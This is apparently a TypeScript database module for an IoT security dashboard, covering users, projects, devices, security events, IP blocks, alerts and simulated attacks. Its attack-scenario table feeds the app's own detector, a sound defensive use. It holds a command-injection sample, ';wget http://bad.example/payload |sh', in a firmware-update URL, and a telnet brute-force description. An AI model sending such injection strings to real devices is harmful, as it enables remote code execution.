import { ensureSchema, sql } from "@/lib/db";
import { createId, createToken, hashToken, safeCompareHash, slugify } from "@/lib/security";
import { analyzePayload, type IngestPayload, type RiskResult } from "@/lib/risk";

type DbDate = string | Date | null;

export type AppUser = {
  id: string;
  name: string;
  email: string;
  password_hash: string;
  role: string;
  created_at: DbDate;
};

export type Project = {
  id: string;
  name: string;
  slug: string;
  description: string;
  owner_user_id: string;
  risk_threshold: number;
  auto_block: boolean;
  created_at: DbDate;
};

export type ProjectSummary = Project & {
  member_role: string;
  device_count: number;
  event_count: number;
  malicious_count: number;
  last_activity: DbDate;
};

export type Device = {
  id: string;
  project_id: string;
  name: string;
  kind: string;
  location: string;
  firmware: string;
  device_key_hash: string;
  status: string;
  last_seen_at: DbDate;
  last_ip: string | null;
  created_at: DbDate;
};

export type DeviceSummary = Device & {
  project_name: string;
  live_status: string;
};

export type SecurityEvent = {
  id: string;
  project_id: string;
  device_id: string | null;
  source_ip: string;
  event_type: string;
  severity: string;
  score: number;
  verdict: string;
  category: string;
  confidence: number;
  summary: string;
  recommended_action: string;
  signals: string[];
  packet: Record<string, unknown>;
  raw: Record<string, unknown>;
  created_at: DbDate;
  project_name?: string;
  device_name?: string | null;
};

export type BlockedIp = {
  id: string;
  project_id: string;
  ip: string;
  reason: string;
  score: number;
  active: boolean;
  created_at: DbDate;
  project_name?: string;
};

export type SecurityAlert = {
  id: string;
  project_id: string;
  event_id: string | null;
  severity: string;
  title: string;
  description: string;
  action: string;
  resolved: boolean;
  created_at: DbDate;
  resolved_at: DbDate;
  project_name?: string;
  source_ip?: string | null;
  score?: number | null;
};

export type DashboardStats = {
  project_count: number;
  device_count: number;
  event_count: number;
  malicious_count: number;
  blocked_count: number;
  alert_count: number;
  avg_score: number;
};

export type DashboardData = {
  stats: DashboardStats;
  projects: ProjectSummary[];
  devices: DeviceSummary[];
  events: SecurityEvent[];
  blockedIps: BlockedIp[];
  alerts: SecurityAlert[];
};

type DeviceCredentialRow = Device & {
  project_name: string;
  risk_threshold: number;
  auto_block: boolean;
};

function normalizeEmail(email: string) {
  return email.trim().toLowerCase();
}

export async function findUserById(id: string) {
  await ensureSchema();
  const [user] = await sql<AppUser>`
    SELECT *
    FROM app_users
    WHERE id = ${id}
    LIMIT 1
  `;

  return user ?? null;
}

export async function findUserByEmail(email: string) {
  await ensureSchema();
  const [user] = await sql<AppUser>`
    SELECT *
    FROM app_users
    WHERE email = ${normalizeEmail(email)}
    LIMIT 1
  `;

  return user ?? null;
}

export async function createUserWithWorkspace(input: {
  name: string;
  email: string;
  passwordHash: string;
}) {
  await ensureSchema();

  const userId = createId("usr");
  const projectId = createId("prj");
  const projectName = `${input.name.trim() || "My"} IoT Project`;

  const [user] = await sql<AppUser>`
    INSERT INTO app_users (id, name, email, password_hash, role)
    VALUES (${userId}, ${input.name.trim()}, ${normalizeEmail(input.email)}, ${input.passwordHash}, 'owner')
    RETURNING *
  `;

  await sql`
    INSERT INTO projects (id, name, slug, description, owner_user_id)
    VALUES (
      ${projectId},
      ${projectName},
      ${slugify(projectName) || "iot-project"},
      'Default workspace created during registration',
      ${userId}
    )
  `;

  await sql`
    INSERT INTO project_members (project_id, user_id, role)
    VALUES (${projectId}, ${userId}, 'owner')
  `;

  return user;
}

export async function getProjectForUser(userId: string, projectId: string) {
  await ensureSchema();
  const [project] = await sql<Project & { member_role: string }>`
    SELECT p.*, pm.role AS member_role
    FROM projects p
    INNER JOIN project_members pm ON pm.project_id = p.id
    WHERE pm.user_id = ${userId}
      AND p.id = ${projectId}
    LIMIT 1
  `;

  return project ?? null;
}

export async function createProjectForUser(userId: string, input: { name: string; description?: string }) {
  await ensureSchema();

  const projectId = createId("prj");
  const name = input.name.trim();
  const [project] = await sql<Project>`
    INSERT INTO projects (id, name, slug, description, owner_user_id)
    VALUES (
      ${projectId},
      ${name},
      ${slugify(name) || "iot-project"},
      ${input.description?.trim() ?? ""},
      ${userId}
    )
    RETURNING *
  `;

  await sql`
    INSERT INTO project_members (project_id, user_id, role)
    VALUES (${projectId}, ${userId}, 'owner')
    ON CONFLICT (project_id, user_id) DO NOTHING
  `;

  return project;
}

export async function createDeviceForProject(
  userId: string,
  input: {
    projectId: string;
    name: string;
    kind?: string;
    location?: string;
    firmware?: string;
  },
) {
  await ensureSchema();

  const project = await getProjectForUser(userId, input.projectId);
  if (!project || project.member_role === "viewer") {
    return null;
  }

  const deviceId = createId("dev");
  const token = createToken();

  const [device] = await sql<Device>`
    INSERT INTO devices (
      id,
      project_id,
      name,
      kind,
      location,
      firmware,
      device_key_hash
    )
    VALUES (
      ${deviceId},
      ${input.projectId},
      ${input.name.trim()},
      ${input.kind?.trim() || "iot-node"},
      ${input.location?.trim() || ""},
      ${input.firmware?.trim() || ""},
      ${hashToken(token)}
    )
    RETURNING *
  `;

  return { device, token };
}

export async function getDashboard(userId: string): Promise<DashboardData> {
  await ensureSchema();

  const [stats] = await sql<DashboardStats>`
    WITH user_projects AS (
      SELECT project_id
      FROM project_members
      WHERE user_id = ${userId}
    )
    SELECT
      (SELECT COUNT(*)::int FROM user_projects) AS project_count,
      (SELECT COUNT(*)::int FROM devices WHERE project_id IN (SELECT project_id FROM user_projects)) AS device_count,
      (SELECT COUNT(*)::int FROM events WHERE project_id IN (SELECT project_id FROM user_projects)) AS event_count,
      (SELECT COUNT(*)::int FROM events WHERE project_id IN (SELECT project_id FROM user_projects) AND verdict = 'malicious') AS malicious_count,
      (SELECT COUNT(*)::int FROM blocked_ips WHERE project_id IN (SELECT project_id FROM user_projects) AND active = true) AS blocked_count,
      (SELECT COUNT(*)::int FROM alerts WHERE project_id IN (SELECT project_id FROM user_projects) AND resolved = false) AS alert_count,
      (SELECT COALESCE(ROUND(AVG(score))::int, 0) FROM events WHERE project_id IN (SELECT project_id FROM user_projects)) AS avg_score
  `;

  const projects = await sql<ProjectSummary>`
    SELECT
      p.*,
      pm.role AS member_role,
      COUNT(DISTINCT d.id)::int AS device_count,
      COUNT(e.id)::int AS event_count,
      COUNT(e.id) FILTER (WHERE e.verdict = 'malicious')::int AS malicious_count,
      COALESCE(MAX(e.created_at), p.created_at) AS last_activity
    FROM projects p
    INNER JOIN project_members pm ON pm.project_id = p.id
    LEFT JOIN devices d ON d.project_id = p.id
    LEFT JOIN events e ON e.project_id = p.id
    WHERE pm.user_id = ${userId}
    GROUP BY p.id, pm.role
    ORDER BY last_activity DESC
  `;

  const devices = await sql<DeviceSummary>`
    SELECT
      d.*,
      p.name AS project_name,
      CASE
        WHEN d.last_seen_at > now() - interval '10 minutes' THEN 'online'
        WHEN d.last_seen_at IS NULL THEN d.status
        ELSE 'idle'
      END AS live_status
    FROM devices d
    INNER JOIN projects p ON p.id = d.project_id
    INNER JOIN project_members pm ON pm.project_id = p.id
    WHERE pm.user_id = ${userId}
    ORDER BY COALESCE(d.last_seen_at, d.created_at) DESC
    LIMIT 60
  `;

  const events = await sql<SecurityEvent>`
    SELECT
      e.*,
      p.name AS project_name,
      d.name AS device_name
    FROM events e
    INNER JOIN projects p ON p.id = e.project_id
    INNER JOIN project_members pm ON pm.project_id = p.id
    LEFT JOIN devices d ON d.id = e.device_id
    WHERE pm.user_id = ${userId}
    ORDER BY e.created_at DESC
    LIMIT 50
  `;

  const blockedIps = await sql<BlockedIp>`
    SELECT b.*, p.name AS project_name
    FROM blocked_ips b
    INNER JOIN projects p ON p.id = b.project_id
    INNER JOIN project_members pm ON pm.project_id = p.id
    WHERE pm.user_id = ${userId}
      AND b.active = true
    ORDER BY b.created_at DESC
    LIMIT 50
  `;

  const alerts = await sql<SecurityAlert>`
    SELECT
      a.*,
      p.name AS project_name,
      e.source_ip,
      e.score
    FROM alerts a
    INNER JOIN projects p ON p.id = a.project_id
    INNER JOIN project_members pm ON pm.project_id = p.id
    LEFT JOIN events e ON e.id = a.event_id
    WHERE pm.user_id = ${userId}
      AND a.resolved = false
    ORDER BY a.created_at DESC
    LIMIT 25
  `;

  return {
    stats: stats ?? {
      project_count: 0,
      device_count: 0,
      event_count: 0,
      malicious_count: 0,
      blocked_count: 0,
      alert_count: 0,
      avg_score: 0,
    },
    projects,
    devices,
    events,
    blockedIps,
    alerts,
  };
}

export async function verifyDeviceToken(projectId: string, deviceId: string, token: string) {
  await ensureSchema();

  const [device] = await sql<DeviceCredentialRow>`
    SELECT d.*, p.name AS project_name, p.risk_threshold, p.auto_block
    FROM devices d
    INNER JOIN projects p ON p.id = d.project_id
    WHERE d.project_id = ${projectId}
      AND d.id = ${deviceId}
    LIMIT 1
  `;

  if (!device) {
    return null;
  }

  if (!safeCompareHash(hashToken(token), device.device_key_hash)) {
    return null;
  }

  return {
    device,
    project: {
      id: device.project_id,
      name: device.project_name,
      riskThreshold: Number(device.risk_threshold),
      autoBlock: Boolean(device.auto_block),
    },
  };
}

export async function getRecentIpEventCount(projectId: string, sourceIp: string) {
  await ensureSchema();
  const [row] = await sql<{ count: number }>`
    SELECT COUNT(*)::int AS count
    FROM events
    WHERE project_id = ${projectId}
      AND source_ip = ${sourceIp}
      AND created_at > now() - interval '5 minutes'
  `;

  return Number(row?.count ?? 0);
}

export async function findActiveBlock(projectId: string, ip: string) {
  await ensureSchema();
  const [block] = await sql<BlockedIp>`
    SELECT *
    FROM blocked_ips
    WHERE project_id = ${projectId}
      AND ip = ${ip}
      AND active = true
    LIMIT 1
  `;

  return block ?? null;
}

export async function updateDeviceSeen(deviceId: string, sourceIp: string, firmware?: string) {
  await ensureSchema();
  await sql`
    UPDATE devices
    SET
      last_seen_at = now(),
      last_ip = ${sourceIp},
      firmware = COALESCE(NULLIF(${firmware ?? ""}, ''), firmware),
      status = 'online'
    WHERE id = ${deviceId}
  `;
}

export async function recordSecurityEvent(input: {
  projectId: string;
  deviceId: string;
  sourceIp: string;
  eventType: string;
  severity: string;
  analysis: RiskResult;
  packet: Record<string, unknown>;
  raw: Record<string, unknown>;
}) {
  await ensureSchema();
  const eventId = createId("evt");

  const [event] = await sql<SecurityEvent>`
    INSERT INTO events (
      id,
      project_id,
      device_id,
      source_ip,
      event_type,
      severity,
      score,
      verdict,
      category,
      confidence,
      summary,
      recommended_action,
      signals,
      packet,
      raw
    )
    VALUES (
      ${eventId},
      ${input.projectId},
      ${input.deviceId},
      ${input.sourceIp},
      ${input.eventType},
      ${input.severity},
      ${input.analysis.score},
      ${input.analysis.verdict},
      ${input.analysis.category},
      ${input.analysis.confidence},
      ${input.analysis.summary},
      ${input.analysis.recommendedAction},
      ${JSON.stringify(input.analysis.signals)}::jsonb,
      ${JSON.stringify(input.packet ?? {})}::jsonb,
      ${JSON.stringify(input.raw ?? {})}::jsonb
    )
    RETURNING *
  `;

  return event;
}

export async function createDetectionAlert(input: {
  projectId: string;
  eventId: string;
  sourceIp: string;
  analysis: RiskResult;
  blocked: boolean;
}) {
  await ensureSchema();

  if (input.analysis.verdict === "clean" && !input.blocked) {
    return null;
  }

  const id = createId("alt");
  const severity =
    input.blocked || input.analysis.verdict === "malicious" ? "critical" : "warning";
  const title = input.blocked
    ? `Blocked malicious source ${input.sourceIp}`
    : `${input.analysis.category.replaceAll("_", " ")} detected`;

  const [alert] = await sql<SecurityAlert>`
    INSERT INTO alerts (
      id,
      project_id,
      event_id,
      severity,
      title,
      description,
      action
    )
    VALUES (
      ${id},
      ${input.projectId},
      ${input.eventId},
      ${severity},
      ${title},
      ${input.analysis.summary},
      ${input.analysis.recommendedAction}
    )
    RETURNING *
  `;

  return alert;
}

export async function upsertBlockedIp(input: {
  projectId: string;
  ip: string;
  reason: string;
  score: number;
}) {
  await ensureSchema();
  const id = createId("blk");
  const [block] = await sql<BlockedIp>`
    INSERT INTO blocked_ips (id, project_id, ip, reason, score, active)
    VALUES (${id}, ${input.projectId}, ${input.ip}, ${input.reason}, ${input.score}, true)
    ON CONFLICT (project_id, ip)
    DO UPDATE SET
      reason = EXCLUDED.reason,
      score = EXCLUDED.score,
      active = true,
      created_at = now()
    RETURNING *
  `;

  return block;
}

export async function createManualBlock(userId: string, input: { projectId: string; ip: string; reason: string }) {
  await ensureSchema();
  const project = await getProjectForUser(userId, input.projectId);

  if (!project || project.member_role === "viewer") {
    return null;
  }

  return upsertBlockedIp({
    projectId: input.projectId,
    ip: input.ip.trim(),
    reason: input.reason.trim() || "Manually blocked by project operator",
    score: 100,
  });
}

export async function disableBlock(userId: string, blockId: string) {
  await ensureSchema();
  const [block] = await sql<BlockedIp>`
    SELECT b.*
    FROM blocked_ips b
    INNER JOIN project_members pm ON pm.project_id = b.project_id
    WHERE b.id = ${blockId}
      AND pm.user_id = ${userId}
      AND pm.role <> 'viewer'
    LIMIT 1
  `;

  if (!block) {
    return null;
  }

  const [updated] = await sql<BlockedIp>`
    UPDATE blocked_ips
    SET active = false
    WHERE id = ${blockId}
    RETURNING *
  `;

  return updated;
}

export async function resolveAlert(userId: string, alertId: string) {
  await ensureSchema();
  const [alert] = await sql<SecurityAlert>`
    SELECT a.*
    FROM alerts a
    INNER JOIN project_members pm ON pm.project_id = a.project_id
    WHERE a.id = ${alertId}
      AND pm.user_id = ${userId}
      AND pm.role <> 'viewer'
    LIMIT 1
  `;

  if (!alert) {
    return null;
  }

  const [updated] = await sql<SecurityAlert>`
    UPDATE alerts
    SET resolved = true, resolved_at = now()
    WHERE id = ${alertId}
    RETURNING *
  `;

  return updated;
}

const attackScenarios: Record<
  string,
  {
    label: string;
    sourceIp: string;
    payload: IngestPayload;
  }
> = {
  mirai_telnet: {
    label: "Mirai-style telnet brute force",
    sourceIp: "198.51.100.23",
    payload: {
      eventType: "attack-simulation",
      severity: "critical",
      message:
        "Mirai botnet pattern: failed password attempts over telnet using root:root and wget /bin/sh payload",
      packet: { protocol: "tcp", destPort: 23, bytes: 4096 },
      telemetry: { authFailures: 140, connectionAttempts: 160 },
    },
  },
  port_scan: {
    label: "Reconnaissance port scan",
    sourceIp: "203.0.113.45",
    payload: {
      eventType: "attack-simulation",
      severity: "high",
      message: "nmap syn scan against SSH, Telnet, HTTP, MQTT, and camera ports",
      packet: { protocol: "tcp", destPort: 22, bytes: 1536, flags: ["SYN"] },
      telemetry: { connectionAttempts: 220, uniquePorts: 28 },
    },
  },
  mqtt_flood: {
    label: "MQTT flood and replay",
    sourceIp: "203.0.113.91",
    payload: {
      eventType: "attack-simulation",
      severity: "critical",
      message: "mqtt flood with replay attack against command topic",
      packet: { protocol: "mqtt", destPort: 1883, bytes: 65000 },
      telemetry: { connectionAttempts: 480 },
    },
  },
  command_injection: {
    label: "Firmware command injection",
    sourceIp: "198.51.100.88",
    payload: {
      eventType: "attack-simulation",
      severity: "critical",
      message: "HTTP request attempted ;wget http://bad.example/payload |sh",
      packet: {
        protocol: "http",
        destPort: 80,
        bytes: 3072,
        path: "/firmware/update?url=;wget%20http://bad.example/payload%20|sh",
      },
      telemetry: { authFailures: 12 },
    },
  },
  data_exfiltration: {
    label: "Suspicious outbound data transfer",
    sourceIp: "203.0.113.120",
    payload: {
      eventType: "attack-simulation",
      severity: "high",
      message: "unexpected bulk upload from sensor subnet to unknown host",
      packet: { protocol: "tcp", destPort: 443, bytes: 875000 },
      telemetry: { outboundBytes: 1250000 },
    },
  },
};

export function listAttackScenarios() {
  return Object.entries(attackScenarios).map(([id, scenario]) => ({
    id,
    label: scenario.label,
  }));
}

export async function runAttackSimulation(
  userId: string,
  input: { projectId: string; deviceId: string; scenario: string },
) {
  await ensureSchema();

  const scenario = attackScenarios[input.scenario];
  if (!scenario) {
    return null;
  }

  const [device] = await sql<DeviceCredentialRow>`
    SELECT d.*, p.name AS project_name, p.risk_threshold, p.auto_block
    FROM devices d
    INNER JOIN projects p ON p.id = d.project_id
    INNER JOIN project_members pm ON pm.project_id = p.id
    WHERE pm.user_id = ${userId}
      AND pm.role <> 'viewer'
      AND d.project_id = ${input.projectId}
      AND d.id = ${input.deviceId}
    LIMIT 1
  `;

  if (!device) {
    return null;
  }

  const sourceIp = scenario.sourceIp;
  const activeBlock = await findActiveBlock(input.projectId, sourceIp);
  const recentIpEvents = await getRecentIpEventCount(input.projectId, sourceIp);
  const analysis = analyzePayload({
    ...scenario.payload,
    sourceIp,
    recentIpEvents,
    alreadyBlocked: Boolean(activeBlock),
  });

  const event = await recordSecurityEvent({
    projectId: input.projectId,
    deviceId: input.deviceId,
    sourceIp,
    eventType: scenario.payload.eventType ?? "attack-simulation",
    severity: scenario.payload.severity ?? "critical",
    analysis,
    packet: scenario.payload.packet ?? {},
    raw: {
      simulation: true,
      scenario: input.scenario,
      label: scenario.label,
      ...scenario.payload,
    },
  });

  await updateDeviceSeen(input.deviceId, sourceIp);

  let blocked = Boolean(activeBlock);
  if (!activeBlock && device.auto_block && analysis.score >= Number(device.risk_threshold)) {
    await upsertBlockedIp({
      projectId: input.projectId,
      ip: sourceIp,
      reason: `Attack simulation: ${analysis.summary}`,
      score: analysis.score,
    });
    blocked = true;
  }

  const alert = await createDetectionAlert({
    projectId: input.projectId,
    eventId: event.id,
    sourceIp,
    analysis,
    blocked,
  });

  return { event, alert, blocked, scenario: scenario.label };
}
